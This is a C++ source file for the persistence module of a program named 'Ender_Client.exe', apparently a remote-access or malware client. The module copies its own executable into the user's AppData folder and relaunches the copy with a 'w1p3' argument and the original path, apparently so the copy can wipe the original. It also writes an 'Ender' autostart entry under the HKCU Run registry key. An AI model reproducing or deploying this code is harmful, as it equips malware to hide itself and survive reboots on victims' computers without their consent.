#include <stdlib.h>
#include "persistence.h"

Registry::Registry()
{
	ValueofKey = new TCHAR[1000];
	RegStr = new TCHAR[1000];
	FileName = new TCHAR[1000];
	ad_path = new char[2000];
	curr_path = new char[2000];
	GetModuleFileName(NULL, FileName, 1000);
	StringCchCopy(RegStr, 1000, L"\"");
	StringCchCat(RegStr, 1000, FileName);
	StringCchCat(RegStr, 1000, L"\"");
}

Registry::~Registry()
{
	delete[] ValueofKey;
	delete[] FileName;
	delete[] RegStr;
	delete[] ad_path;
	delete[] curr_path;
}


bool Registry::set_reg_key()
{
	if (RegCreateKeyEx(
		HKEY_CURRENT_USER,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		NULL,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&key,
		NULL
	) != ERROR_SUCCESS)
	{
		return false;
	}

	if (RegSetValueEx(
		key,
		L"Ender",
		NULL,
		REG_SZ,
		(LPBYTE)RegStr,
		(lstrlen(RegStr) * 2) + 1
	) != ERROR_SUCCESS)
	{
		RegCloseKey(key);
		return false;
	}
	RegCloseKey(key);
	return true;
}

bool Registry::check_reg_key() {
	if (RegOpenKeyEx(
		HKEY_CURRENT_USER,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_ALL_ACCESS,
		&key
	) != ERROR_SUCCESS)
	{
		return false;
	}

	if (RegQueryInfoKey(
		key,
		NULL, NULL, NULL, NULL, NULL, NULL, &TotalKeys, NULL, NULL, NULL, NULL
	) != ERROR_SUCCESS)
	{
		RegCloseKey(key);
		return false;
	}

	for (int i = 0; i < TotalKeys; i++)
	{
		if (RegEnumValue(
			key,
			i,
			ValueofKey,
			&lenValueKey, NULL, NULL, NULL, NULL
		) != ERROR_SUCCESS)
		{
			RegCloseKey(key);
			return false;
		}
		if (lstrcmp(ValueofKey, L"Ender") == 0)
		{
			RegCloseKey(key);
			return true;
		}
	}
	RegCloseKey(key);
	return false;
}

bool Registry::is_in_ad()
{
	ExpandEnvironmentStringsA("%APPDATA%", ad_path, 2000);
	GetModuleFileNameA(NULL, curr_path, 2000);

	if(strlen(ad_path) > strlen(curr_path))
	{
		return false;
	}

	for(int i=0;i<strlen(ad_path);i++)
	{
		if(tolower(curr_path[i]) != tolower(ad_path[i]))
		{
			return false;
		}
	}

	return true;
}

void Registry::move_to_ad()
{
	LARGE_INTEGER size;

	StringCchCatA(ad_path, 2000, "\\Ender_Client.exe");
	HANDLE remote_file = CreateFileA(ad_path,
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	HANDLE curr_file = CreateFileA(curr_path,
		GENERIC_READ,
		NULL,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	GetFileSizeEx(curr_file, &size);
	BYTE* file_con = (BYTE*)malloc(sizeof(BYTE) * size.LowPart);

	ReadFile(curr_file,
		file_con,
		size.LowPart,
		NULL,
		NULL);

	WriteFile(remote_file,
		file_con,
		size.LowPart,
		NULL,
		NULL);

	CloseHandle(curr_file);
	CloseHandle(remote_file);

	STARTUPINFOA s_info = { sizeof(s_info) };;
	PROCESS_INFORMATION p_info;

	char* cmd_to_pass = new char[2000];
	StringCchCopyA(cmd_to_pass, 2000, "w1p3 ");

	StringCchCatA(cmd_to_pass, 2000, curr_path);
	CreateProcessA(ad_path,
		cmd_to_pass, NULL, NULL, FALSE, NULL, NULL, NULL, &s_info, &p_info);

	ExitProcess(0);
}